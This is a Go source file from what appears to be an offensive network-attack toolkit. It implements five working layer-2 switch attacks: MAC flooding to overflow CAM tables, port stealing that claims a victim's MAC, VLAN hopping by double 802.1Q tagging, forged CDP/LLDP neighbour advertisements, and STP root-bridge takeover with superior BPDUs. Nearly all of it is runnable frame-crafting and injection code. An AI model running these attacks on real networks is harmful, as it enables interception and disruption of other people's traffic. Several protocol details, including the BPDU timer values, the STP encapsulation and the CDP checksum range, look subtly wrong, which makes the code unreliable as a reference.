// Package switch implements the layer-2 switch attacks: MAC flooding (CAM
// table overflow), port stealing, VLAN double-tagging, CDP/LLDP neighbour
// injection and STP root-bridge takeover. These all work against managed
// switches by crafting raw Ethernet frames.
package switchattack

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/QYVORA/qyvora-toha3ee/internal/attacks"
	"github.com/QYVORA/qyvora-toha3ee/internal/netx"
	"github.com/QYVORA/qyvora-toha3ee/internal/safety"
)

func init() {
	attacks.Register(&MACFlood{})
	attacks.Register(&PortSteal{})
	attacks.Register(&VLANHop{})
	attacks.Register(&CDPInject{})
	attacks.Register(&STPTakeover{})
}

// rawSender writes crafted frames on an interface in promiscuous mode.
type rawSender struct {
	iface *netx.Iface
	h     *pcap.Handle
	sent  int
}

func newRawSender(iface *netx.Iface) (*rawSender, error) {
	h, err := pcap.OpenLive(iface.Name, 65535, true, 100*time.Millisecond)
	if err != nil {
		return nil, fmt.Errorf("open %s: %w", iface.Name, err)
	}
	return &rawSender{iface: iface, h: h}, nil
}

func (r *rawSender) Write(data []byte) error {
	if err := r.h.WritePacketData(data); err != nil {
		return err
	}
	r.sent++
	return nil
}

func (r *rawSender) Close() {
	if r.h != nil {
		r.h.Close()
		r.h = nil
	}
}

func serialize(opts gopacket.SerializeOptions, layers ...gopacket.SerializableLayer) ([]byte, error) {
	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, opts, layers...); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// ---- switch.flood (MAC flooding / CAM overflow) ----

// MACFlood overflows the switch CAM table with spoofed source MAC addresses
// so the switch stops learning and falls back to flooding traffic to every
// port, making the rest of the network sniffable.
type MACFlood struct{}

// Meta implements attacks.Module.
func (*MACFlood) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "switch.flood",
		Category:    "switch",
		Risk:        attacks.RiskCritical,
		Targets:     []string{"gateway"},
		Requires:    []string{"cap.raw_socket"},
		Description: "MAC flooding: overflow the switch CAM table with spoofed source MACs to force hub-like flooding",
		Limitations: "many switches drop excessive frames or rate-limit unknown-unicast flooding; 802.1X port security and MAC limiting block this",
	}
}

// Preflight checks for the root and raw-socket privileges needed to inject
// spoofed Ethernet frames.
func (*MACFlood) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if err := safety.RequireRoot(); err == nil {
		rep.AddOK("root", "raw sockets available")
	} else {
		rep.AddBlocked("root", err.Error())
	}
	if ctx.Iface == nil {
		rep.AddBlocked("iface", "no interface configured")
	} else {
		rep.AddOK("iface", ctx.Iface.String())
	}
	return rep, nil
}

// Run floods random-source ARP frames until the attack is stopped.
func (*MACFlood) Run(ctx *attacks.AttackCtx, _ map[string]string) error {
	s, err := newRawSender(ctx.Iface)
	if err != nil {
		return err
	}
	ctx.SetState("switch.flood", s)
	ctx.Safety.RegisterCleanup("switch.flood", "stop MAC flood", func() error {
		s.Close()
		return nil
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("switch.flood", hb)

	ctx.Printf("[*] switch.flood overflowing CAM table on %s...\n", ctx.Iface.Name)
	for {
		select {
		case <-ctx.Done:
			return nil
		default:
		}
		var mac net.HardwareAddr
		for len(mac) < 6 {
			mac = append(mac, byte(rand.Intn(256)))
		}
		mac[0] &^= 0x01 // clear multicast bit
		raw, err := serialize(gopacket.SerializeOptions{FixLengths: true},
			&layers.Ethernet{SrcMAC: mac, DstMAC: broadcastMAC, EthernetType: layers.EthernetTypeARP},
			&layers.ARP{
				AddrType: layers.LinkTypeEthernet, Protocol: layers.EthernetTypeIPv4,
				HwAddressSize: 6, ProtAddressSize: 4, Operation: layers.ARPRequest,
				SourceHwAddress: mac, SourceProtAddress: net.IPv4(randByte(), randByte(), randByte(), randByte()),
				DstHwAddress: broadcastMAC, DstProtAddress: net.IPv4(randByte(), randByte(), randByte(), randByte()),
			})
		if err != nil {
			time.Sleep(time.Second)
			continue
		}
		if err := s.Write(raw); err != nil {
			ctx.Printf("[!] switch.flood: %v\n", err)
			time.Sleep(time.Second)
			continue
		}
		hb.Beat()
		if s.sent%1000 == 0 {
			ctx.Printf("[switch.flood] %d spoofed frames sent\n", s.sent)
		}
	}
}

// Verify reports how many spoofed-source frames were injected.
func (*MACFlood) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("switch.flood")
	if !ok {
		return &attacks.Impact{Summary: "MAC flood was active"}, nil
	}
	s := v.(*rawSender)
	imp := &attacks.Impact{Summary: fmt.Sprintf("sent %d spoofed-source frames", s.sent)}
	imp.Add("frames_sent", fmt.Sprintf("%d", s.sent))
	return imp, nil
}

// Cleanup stops the flood and closes the raw sender socket.
func (*MACFlood) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("switch.flood")
	ctx.Safety.UnregisterCleanup("switch.flood")
	if v, ok := ctx.GetState("switch.flood"); ok {
		v.(*rawSender).Close()
	}
	return nil
}

// ---- switch.portsteal ----

// PortSteal continuously re-advertises the victim's MAC address so the switch
// learns it on the attacker's port; traffic addressed to the victim is then
// forwarded to the attacker until the victim responds and re-learns its own
// port. This is a race the attacker must keep winning.
type PortSteal struct{}

// Meta implements attacks.Module.
func (*PortSteal) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "switch.portsteal",
		Category:    "switch",
		Risk:        attacks.RiskCritical,
		Targets:     []string{"host"},
		Requires:    []string{"cap.raw_socket"},
		Description: "port stealing: continuously claim the victim's MAC so the switch forwards its traffic to this port",
		Limitations: "a race: the victim's own traffic re-learns its port; only works until it responds; disruptive if it wins on both directions",
	}
}

// Preflight checks for raw-socket access and notes the victim MAC requirement.
func (*PortSteal) Preflight(_ *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if err := safety.RequireRoot(); err == nil {
		rep.AddOK("root", "raw sockets available")
	} else {
		rep.AddBlocked("root", err.Error())
	}
	rep.AddFixable("target", "set switch.portsteal.victim_mac to the victim's MAC address")
	return rep, nil
}

// Run continuously advertises the victim's MAC as belonging to this port
// until the attack is stopped.
func (*PortSteal) Run(ctx *attacks.AttackCtx, _ map[string]string) error {
	victimStr := ctx.Conf.GetDefault("switch.portsteal", "victim_mac", "")
	if victimStr == "" {
		return fmt.Errorf("switch.portsteal: set switch.portsteal.victim_mac to the victim MAC")
	}
	victim, err := net.ParseMAC(victimStr)
	if err != nil {
		return fmt.Errorf("switch.portsteal: bad victim MAC %q: %w", victimStr, err)
	}
	if ctx.Iface == nil {
		return fmt.Errorf("switch.portsteal: no interface configured")
	}

	s, err := newRawSender(ctx.Iface)
	if err != nil {
		return err
	}
	ctx.SetState("switch.portsteal", s)
	ctx.Safety.RegisterCleanup("switch.portsteal", "stop port stealing", func() error {
		s.Close()
		return nil
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("switch.portsteal", hb)

	ctx.Printf("[*] switch.portsteal claiming %s on %s (victim's inbound traffic will be redirected here)\n", victim, ctx.Iface.Name)
	for {
		select {
		case <-ctx.Done:
			return nil
		default:
		}
		raw, err := serialize(gopacket.SerializeOptions{FixLengths: true},
			&layers.Ethernet{SrcMAC: victim, DstMAC: broadcastMAC, EthernetType: layers.EthernetTypeARP},
			&layers.ARP{
				AddrType: layers.LinkTypeEthernet, Protocol: layers.EthernetTypeIPv4,
				HwAddressSize: 6, ProtAddressSize: 4, Operation: layers.ARPRequest,
				SourceHwAddress: victim, SourceProtAddress: ctx.Iface.IP,
				DstHwAddress: broadcastMAC, DstProtAddress: ctx.Iface.IP,
			})
		if err != nil {
			time.Sleep(time.Second)
			continue
		}
		if err := s.Write(raw); err != nil {
			ctx.Printf("[!] switch.portsteal: %v\n", err)
			time.Sleep(time.Second)
			continue
		}
		hb.Beat()
		if s.sent%500 == 0 {
			ctx.Printf("[switch.portsteal] claimed victim %d times\n", s.sent)
		}
		time.Sleep(10 * time.Millisecond)
	}
}

// Verify reports how many times the victim's MAC was claimed.
func (*PortSteal) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("switch.portsteal")
	if !ok {
		return &attacks.Impact{Summary: "port stealing was active"}, nil
	}
	s := v.(*rawSender)
	imp := &attacks.Impact{Summary: fmt.Sprintf("claimed the victim's MAC %d times", s.sent)}
	imp.Add("claims", fmt.Sprintf("%d", s.sent))
	return imp, nil
}

// Cleanup stops the port-stealing flood and closes the raw sender socket.
func (*PortSteal) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("switch.portsteal")
	ctx.Safety.UnregisterCleanup("switch.portsteal")
	if v, ok := ctx.GetState("switch.portsteal"); ok {
		v.(*rawSender).Close()
	}
	return nil
}

// ---- switch.vlanhop (double tagging) ----

// VLANHop exploits a switch trunk's handling of 802.1Q tags: a frame carrying
// two tags has the outer (native) tag stripped and is forwarded onto the
// inner VLAN, letting the attacker reach hosts on a different VLAN.
type VLANHop struct{}

// Meta implements attacks.Module.
func (*VLANHop) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "switch.vlanhop",
		Category:    "switch",
		Risk:        attacks.RiskHigh,
		Targets:     []string{"host"},
		Requires:    []string{"cap.raw_socket"},
		Description: "VLAN hopping via double 802.1Q tagging to reach hosts on a different VLAN",
		Limitations: "only works on trunk ports and switches with default/native VLAN misconfiguration; replies rarely return to the attacker",
	}
}

// Preflight checks for raw-socket access and notes the target IP/VLAN config.
func (*VLANHop) Preflight(_ *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if err := safety.RequireRoot(); err == nil {
		rep.AddOK("root", "raw sockets available")
	} else {
		rep.AddBlocked("root", err.Error())
	}
	rep.AddFixable("target", "set switch.vlanhop.target_ip and switch.vlanhop.vlan to the target host and its VLAN")
	return rep, nil
}

// Run sends double-tagged ARP probes toward the target VLAN until stopped.
func (*VLANHop) Run(ctx *attacks.AttackCtx, _ map[string]string) error {
	targetStr := ctx.Conf.GetDefault("switch.vlanhop", "target_ip", "")
	if targetStr == "" {
		return fmt.Errorf("switch.vlanhop: set switch.vlanhop.target_ip")
	}
	target := net.ParseIP(targetStr)
	if target == nil {
		return fmt.Errorf("switch.vlanhop: bad target IP %q", targetStr)
	}
	vlan := ctx.Conf.GetDefault("switch.vlanhop", "vlan", "")
	if vlan == "" {
		return fmt.Errorf("switch.vlanhop: set switch.vlanhop.vlan")
	}
	var vlanID uint16
	if _, err := fmt.Sscanf(vlan, "%d", &vlanID); err != nil || vlanID == 0 {
		return fmt.Errorf("switch.vlanhop: bad vlan %q", vlan)
	}

	s, err := newRawSender(ctx.Iface)
	if err != nil {
		return err
	}
	ctx.SetState("switch.vlanhop", s)
	ctx.Safety.RegisterCleanup("switch.vlanhop", "stop vlan hop", func() error {
		s.Close()
		return nil
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("switch.vlanhop", hb)

	// Outer tag rides the native (access) VLAN; inner tag selects the victim
	// VLAN. The ARP request asks the victim to answer the attacker's IP so its
	// MAC is learned (reply traffic still needs a separate path back).
	ctx.Printf("[*] switch.vlanhop double-tagging toward %s on VLAN %d\n", target, vlanID)
	for {
		select {
		case <-ctx.Done:
			return nil
		default:
		}
		raw, err := serialize(gopacket.SerializeOptions{FixLengths: true},
			&layers.Ethernet{SrcMAC: ctx.Iface.MAC, DstMAC: broadcastMAC, EthernetType: layers.EthernetTypeDot1Q},
			&layers.Dot1Q{Priority: 0, VLANIdentifier: 1}, // native VLAN tag
			&layers.Dot1Q{Priority: 0, VLANIdentifier: vlanID},
			&layers.ARP{
				AddrType: layers.LinkTypeEthernet, Protocol: layers.EthernetTypeIPv4,
				HwAddressSize: 6, ProtAddressSize: 4, Operation: layers.ARPRequest,
				SourceHwAddress: ctx.Iface.MAC, SourceProtAddress: ctx.Iface.IP,
				DstHwAddress: broadcastMAC, DstProtAddress: target.To4(),
			})
		if err != nil {
			time.Sleep(time.Second)
			continue
		}
		if err := s.Write(raw); err != nil {
			ctx.Printf("[!] switch.vlanhop: %v\n", err)
			time.Sleep(time.Second)
			continue
		}
		hb.Beat()
		if s.sent%100 == 0 {
			ctx.Printf("[switch.vlanhop] sent %d double-tagged frames\n", s.sent)
		}
		time.Sleep(50 * time.Millisecond)
	}
}

// Verify reports how many double-tagged frames were sent.
func (*VLANHop) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("switch.vlanhop")
	if !ok {
		return &attacks.Impact{Summary: "VLAN hopping was active"}, nil
	}
	s := v.(*rawSender)
	imp := &attacks.Impact{Summary: fmt.Sprintf("sent %d double-tagged frames", s.sent)}
	imp.Add("frames_sent", fmt.Sprintf("%d", s.sent))
	return imp, nil
}

// Cleanup stops the VLAN-hop flood and closes the raw sender socket.
func (*VLANHop) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("switch.vlanhop")
	ctx.Safety.UnregisterCleanup("switch.vlanhop")
	if v, ok := ctx.GetState("switch.vlanhop"); ok {
		v.(*rawSender).Close()
	}
	return nil
}

// ---- switch.cdp (CDP/LLDP injection) ----

// CDPInject sends forged Cisco Discovery Protocol and LLDP frames that
// advertise a fake device on the wire. Neighbour-management tools, VoIP
// phones and monitoring systems then believe a rogue device exists, enabling
// information gathering (e.g. the fake platform/version) and network-recon
// deception.
type CDPInject struct{}

// Meta implements attacks.Module.
func (*CDPInject) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "switch.cdp",
		Category:    "switch",
		Risk:        attacks.RiskMedium,
		Targets:     []string{"gateway"},
		Requires:    []string{"cap.raw_socket"},
		Description: "CDP/LLDP injection: advertise a forged neighbouring device to switch management, VoIP and monitoring systems",
		Limitations: "only works when CDP/LLDP is enabled on the adjacent switch port; CDP is Cisco-proprietary",
	}
}

// Preflight checks for raw-socket access.
func (*CDPInject) Preflight(_ *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if err := safety.RequireRoot(); err == nil {
		rep.AddOK("root", "raw sockets available")
	} else {
		rep.AddBlocked("root", err.Error())
	}
	return rep, nil
}

// Run injects forged CDP and LLDP frames every second until stopped.
func (*CDPInject) Run(ctx *attacks.AttackCtx, _ map[string]string) error {
	s, err := newRawSender(ctx.Iface)
	if err != nil {
		return err
	}
	ctx.SetState("switch.cdp", s)
	ctx.Safety.RegisterCleanup("switch.cdp", "stop CDP/LLDP injection", func() error {
		s.Close()
		return nil
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("switch.cdp", hb)

	ctx.Printf("[*] switch.cdp advertising fake device on %s...\n", ctx.Iface.Name)
	for {
		select {
		case <-ctx.Done:
			return nil
		default:
		}
		// CDP: multicast dst 01:00:0c:cc:cc:cc, ethertype 0x2000.
		cdp := buildCDP(ctx.Iface)
		if err := s.Write(cdp); err != nil {
			ctx.Printf("[!] switch.cdp: %v\n", err)
		}
		// LLDP: multicast dst 01:80:c2:00:00:0e, ethertype 0x88cc.
		lldp := buildLLDP(ctx.Iface)
		if err := s.Write(lldp); err != nil {
			ctx.Printf("[!] switch.cdp: %v\n", err)
		}
		hb.Beat()
		if s.sent%10 == 0 {
			ctx.Printf("[switch.cdp] %d CDP/LLDP frames sent\n", s.sent)
		}
		time.Sleep(time.Second)
	}
}

// Verify reports how many CDP/LLDP frames were injected.
func (*CDPInject) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("switch.cdp")
	if !ok {
		return &attacks.Impact{Summary: "CDP/LLDP injection was active"}, nil
	}
	s := v.(*rawSender)
	imp := &attacks.Impact{Summary: fmt.Sprintf("sent %d CDP/LLDP frames", s.sent)}
	imp.Add("frames_sent", fmt.Sprintf("%d", s.sent))
	return imp, nil
}

// Cleanup stops the CDP/LLDP injection and closes the raw sender socket.
func (*CDPInject) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("switch.cdp")
	ctx.Safety.UnregisterCleanup("switch.cdp")
	if v, ok := ctx.GetState("switch.cdp"); ok {
		v.(*rawSender).Close()
	}
	return nil
}

// buildCDP crafts a Cisco Discovery Protocol frame with device-ID, port-ID,
// capability, platform, software-version and native-VLAN TLVs.
func buildCDP(iface *netx.Iface) []byte {
	var body []byte
	tlv := func(typ uint16, val []byte) {
		b := make([]byte, 4+len(val))
		binary.BigEndian.PutUint16(b[0:2], typ)
		binary.BigEndian.PutUint16(b[2:4], uint16(4+len(val)))
		copy(b[4:], val)
		body = append(body, b...)
	}
	devID := "toha3ee-" + iface.MAC.String()
	tlv(0x0001, []byte(devID))                  // device ID
	tlv(0x0003, []byte("eth0"))                 // port ID
	tlv(0x0004, []byte{0x00, 0x00})             // capabilities: host + switch
	tlv(0x0005, []byte("toha3ee 0.1"))          // software version
	tlv(0x0006, []byte("toha3ee-embedded"))     // platform
	tlv(0x000a, []byte{0x00, 0x00, 0x00, 0x01}) // native VLAN 1

	hdr := make([]byte, 8)
	hdr[0] = 0x02                                // CDP version
	hdr[1] = 180                                 // TTL
	hdr[3] = 0                                   // checksum computed below
	binary.BigEndian.PutUint16(hdr[4:6], 0x0002) // fixed header type
	binary.BigEndian.PutUint16(hdr[6:8], uint16(8+len(body)))

	frame := make([]byte, 0, 14+8+len(body))
	frame = append(frame, 0x01, 0x00, 0x0c, 0xcc, 0xcc, 0xcc) // CDP multicast
	frame = append(frame, iface.MAC...)
	frame = append(frame, 0x20, 0x00) // CDP ethertype
	frame = append(frame, hdr...)
	frame = append(frame, body...)

	// CDP checksum (ones' complement over the CDP header+body).
	var sum uint32
	for i := 2; i+1 < len(frame); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(frame[i : i+2]))
	}
	sum = (sum >> 16) + (sum & 0xffff)
	sum += sum >> 16
	frame[16] = byte(^uint16(sum) >> 8) // frame[16:18] is the checksum field
	frame[17] = byte(^uint16(sum) & 0xff)
	return frame
}

// buildLLDP crafts an 802.1AB Link Layer Discovery Protocol frame.
func buildLLDP(iface *netx.Iface) []byte {
	chassisID := append([]byte{0x05}, []byte(iface.MAC.String())...) // MAC subtype 5
	portID := append([]byte{0x03}, []byte("eth0")...)                // interface-name subtype 3
	ttl := []byte{0x00, 0x78}                                        // 120s
	tlv := func(typ uint16, val []byte) []byte {
		b := make([]byte, 2+len(val))
		binary.BigEndian.PutUint16(b[0:2], typ<<9|uint16(len(val)))
		copy(b[2:], val)
		return b
	}
	payload := append(tlv(0, chassisID), tlv(1, portID)...)
	payload = append(payload, tlv(2, ttl)...)
	payload = append(payload, tlv(127, []byte("toha3ee lldp injection"))...)

	frame := make([]byte, 0, 14+len(payload))
	frame = append(frame, 0x01, 0x80, 0xc2, 0x00, 0x00, 0x0e) // LLDP multicast
	frame = append(frame, iface.MAC...)
	frame = append(frame, 0x88, 0xcc)
	frame = append(frame, payload...)
	return frame
}

// ---- switch.stp (STP root takeover) ----

// STPTakeover floods the bridge network with superior (root-priority 0)
// Bridge Protocol Data Units so Spanning Tree elects this host as the root
// bridge. All traffic then crosses the attacker's segment, enabling passive
// interception of inter-switch traffic.
type STPTakeover struct{}

// Meta implements attacks.Module.
func (*STPTakeover) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "switch.stp",
		Category:    "switch",
		Risk:        attacks.RiskCritical,
		Targets:     []string{"gateway"},
		Requires:    []string{"cap.raw_socket"},
		Description: "STP takeover: send superior BPDUs to become the root bridge and reroute inter-switch traffic",
		Limitations: "only works if the attacker port is a designated-capable port; on blocked ports BPDUs are dropped; modern networks often run RSTP/MST with root guards",
	}
}

// Preflight checks for the raw-socket privileges needed to emit BPDUs.
func (*STPTakeover) Preflight(_ *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if err := safety.RequireRoot(); err == nil {
		rep.AddOK("root", "raw sockets available")
	} else {
		rep.AddBlocked("root", err.Error())
	}
	return rep, nil
}

// Run floods superior BPDUs until this host is elected root bridge.
func (*STPTakeover) Run(ctx *attacks.AttackCtx, _ map[string]string) error {
	s, err := newRawSender(ctx.Iface)
	if err != nil {
		return err
	}
	ctx.SetState("switch.stp", s)
	ctx.Safety.RegisterCleanup("switch.stp", "stop STP takeover", func() error {
		s.Close()
		return nil
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("switch.stp", hb)

	ctx.Printf("[*] switch.stp sending superior BPDUs to become root bridge on %s...\n", ctx.Iface.Name)
	for {
		select {
		case <-ctx.Done:
			return nil
		default:
		}
		raw, err := buildBPDU(ctx.Iface.MAC)
		if err != nil {
			time.Sleep(time.Second)
			continue
		}
		if err := s.Write(raw); err != nil {
			ctx.Printf("[!] switch.stp: %v\n", err)
			time.Sleep(time.Second)
			continue
		}
		hb.Beat()
		if s.sent%10 == 0 {
			ctx.Printf("[switch.stp] %d superior BPDUs sent\n", s.sent)
		}
		time.Sleep(500 * time.Millisecond)
	}
}

// Verify reports how many superior BPDUs were sent.
func (*STPTakeover) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("switch.stp")
	if !ok {
		return &attacks.Impact{Summary: "STP takeover was active"}, nil
	}
	s := v.(*rawSender)
	imp := &attacks.Impact{Summary: fmt.Sprintf("sent %d superior BPDUs", s.sent)}
	imp.Add("bpdu_sent", fmt.Sprintf("%d", s.sent))
	return imp, nil
}

// Cleanup stops the BPDU flood and closes the raw sender socket.
func (*STPTakeover) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("switch.stp")
	ctx.Safety.UnregisterCleanup("switch.stp")
	if v, ok := ctx.GetState("switch.stp"); ok {
		v.(*rawSender).Close()
	}
	return nil
}

// buildBPDU crafts a classic (802.1D) Configuration BPDU with root-priority 0
// so it is strictly better than any real bridge's. The frame is SNAP
// encapsulated: Ethernet dst 01:80:c2:00:00:00, length field, LLC/SNAP
// AA:AA:03:00:00:0c:00:01, then the 35-byte BPDU.
func buildBPDU(mac net.HardwareAddr) ([]byte, error) {
	// IEEE 802.1D configuration BPDU: 35 bytes (indices 0..34).
	bpdu := make([]byte, 35)
	bpdu[0], bpdu[1] = 0x00, 0x00 // protocol id (STP)
	bpdu[2] = 0x00                // version (classic STP)
	bpdu[3] = 0x00                // BPDU type (configuration)
	// bpdu[4] flags: 0 (no topology change)
	rootID := rootBridgeID(mac)
	copy(bpdu[5:13], rootID)                            // root bridge id (priority 0 + MAC)
	bpdu[13], bpdu[14], bpdu[15], bpdu[16] = 0, 0, 0, 0 // root path cost 0
	copy(bpdu[17:25], rootID)                           // designated bridge id (same: we are root)
	bpdu[25], bpdu[26] = 0x00, 0x01                     // port id 1
	bpdu[27], bpdu[28] = 0x00, 0x00                     // message age 0
	bpdu[29], bpdu[30] = 0x00, 0x14                     // max age 20s (0x14 in 1/256s units)
	bpdu[31], bpdu[32] = 0x00, 0x0f                     // hello time 2s
	bpdu[33], bpdu[34] = 0x00, 0x0f                     // forward delay 15s

	llcSnap := []byte{0xaa, 0xaa, 0x03, 0x00, 0x00, 0x0c, 0x00, 0x01}

	frame := make([]byte, 0, 14+len(llcSnap)+len(bpdu))
	frame = append(frame, 0x01, 0x80, 0xc2, 0x00, 0x00, 0x00) // STP multicast
	frame = append(frame, mac...)
	frame = append(frame, 0x00, byte(len(llcSnap)+len(bpdu))) // 802.3 length field
	frame = append(frame, llcSnap...)
	frame = append(frame, bpdu...)
	return frame, nil
}

// rootBridgeID builds a 64-bit bridge id (priority 0 + MAC).
func rootBridgeID(mac net.HardwareAddr) []byte {
	id := make([]byte, 8)
	id[0] = 0x00
	id[1] = 0x00
	copy(id[2:], mac)
	return id
}

var broadcastMAC = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

func randByte() byte {
	return byte(rand.Intn(256))
}
